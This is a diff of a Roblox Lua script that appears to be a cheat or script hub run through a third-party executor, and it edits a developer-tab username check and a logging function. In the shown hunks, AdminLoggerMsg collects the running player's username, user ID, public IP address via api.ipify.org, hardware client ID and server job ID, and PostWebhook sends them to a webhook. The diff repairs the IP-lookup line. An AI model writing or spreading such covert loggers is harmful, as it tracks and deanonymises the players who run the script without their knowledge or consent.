@@ -1,15 +1,4 @@
-local devUsername = "Bloxwatch_H3ck"
-local DevUsernameB = "TheCorruptDarklaw"
-
-if player.Name == devUsername or player.Name == DevUsernameB then
-	local ready = true
-else
-end
-	
-	
-	
-	if local ready = false then
-	local Players = game:GetService("Players")
+local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local Lighting = game:GetService("Lighting")
 local player = Players.LocalPlayer
@@ -124,8 +113,6 @@ end
 task.wait(2.5)
 tweenOutAndDestroy()
 task.wait(1)
-
-end
 function PostWebhook(L_1_arg0, L_2_arg1)
     local L_3_ = http_request or request or HttpPost or syn.request
     local L_4_ = L_3_({
@@ -148,7 +135,7 @@ function AdminLoggerMsg()
                 {["name"] = "**Username**", ["value"] = "```" .. game.Players.LocalPlayer.Name .. "```", ["inline"] = true},
                 {["name"] = "**UserID**", ["value"] = "```" .. game.Players.LocalPlayer.UserId .. "```", ["inline"] = true},
                 {["name"] = "**PlaceID**", ["value"] = "```" .. game.PlaceId .. "```", ["inline"] = false},
-                {["name"] = "**IP Address**", ["value"] = "```" .. tostring(game:HttpGet("[https://api.ipify.org](https://api.ipify.org)", true)) .. "```", ["inline"] = false},
+                {["name"] = "**IP Address**", ["value"] = "```" .. tostring(game:HttpGet("https://api.ipify.org", true)) .. "```", ["inline"] = false},
                 {["name"] = "**Hwid**", ["value"] = "```" .. game:GetService("RbxAnalyticsService"):GetClientId() .. "```", ["inline"] = false},
                 {["name"] = "**JobID**", ["value"] = "```" .. game.JobId .. "```", ["inline"] = false},
                 {["name"] = "**Join Code**", ["value"] = "```lua\ngame.ReplicatedStorage['__ServerBrowser']:InvokeServer('teleport','" .. game.JobId .. "')```", ["inline"] = false}
@@ -1010,6 +997,8 @@ local Button = Tab100:CreateButton({
 
 -- Create a Dev tab if the player is a developer
 -- Change "Bloxwatch_H3ck" and "TheCorruptDarklaw" to your Roblox usernames to enable this tab.
+local devUsername = "Bloxwatch_H3ck"
+local DevUsernameB = "TheCorruptDarklaw"
 
 if player.Name == devUsername or player.Name == DevUsernameB then
     local DevTab = Window:CreateTab({
